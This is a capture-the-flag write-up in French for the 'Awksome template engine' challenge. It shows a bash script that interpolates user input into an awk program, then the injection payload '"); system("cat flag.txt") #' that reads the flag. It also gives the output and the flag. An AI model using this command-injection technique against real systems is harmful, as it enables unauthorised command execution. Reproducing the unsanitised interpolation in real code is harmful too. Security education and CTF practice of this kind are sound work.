# Awksome template engine ✉️

### Information:
- tcp://REDACTED:REDACTED
- Localisation du flag `./flag.txt`

Je me connecte et on me crache le code source au visage! :)

```
#!/usr/bin/bash

cat "${0}"

/usr/games/cowsay -f tux.cow "Bienvenue sur notre engin de génération de courriel !"

echo -n "Pour: "
read -r RECEIVER

echo -n "De: "
read -r SENDER

echo -n "Sujet: "
read -r SUBJECT

echo -n "Contenu: "
read -r MSG

echo -e "Création ...\n\n\n"

read -rd '' PROGRAM << EOF
{ 
  gsub(/:receiver:/,"${RECEIVER}");
  gsub(/:sender:/,"${SENDER}");
  gsub(/:subject:/,"${SUBJECT}");
  gsub(/:msg:/,"${MSG}");
}1
EOF

awk "${PROGRAM}" < template

exit 0
```

Comme dans un precedant challenge (Chip_Legend) on se sert de `:name:` comme valeur a remplacer mais cette fois avec `awk`

Visiblement cette partit est vulnerable
```bash
{ 
  gsub(/:receiver:/,"${RECEIVER}");
  gsub(/:sender:/,"${SENDER}");
  gsub(/:subject:/,"${SUBJECT}");
  gsub(/:msg:/,"${MSG}");
}1
```

Donc pour une valeur de `${MSG}` `"); system("cat flag.txt") #`
Le code va donc donner ceci:

```bash
{ 
  gsub(/:receiver:/,"${RECEIVER}");
  gsub(/:sender:/,"${SENDER}");
  gsub(/:subject:/,"${SUBJECT}");
  gsub(/:msg:/,""); system("cat flag.txt") #);
}1
```


```bash
# ------------------------------------------------------

 _________________________________________
/ Bienvenue sur notre engin de génération \
\ de courriel !                           /
 -----------------------------------------
   \
    \
        .--.
       |o_o |
       |:_/ |
      //   \ \
     (|     | )
    /'\_   _/`\
    \___)=(___/

Pour: 
De: 
Sujet: 
Contenu: "); system("cat flag.txt") #
Création ...
```


`FINCTF-d4082e4816e0a3059e9b7a5bb473f7`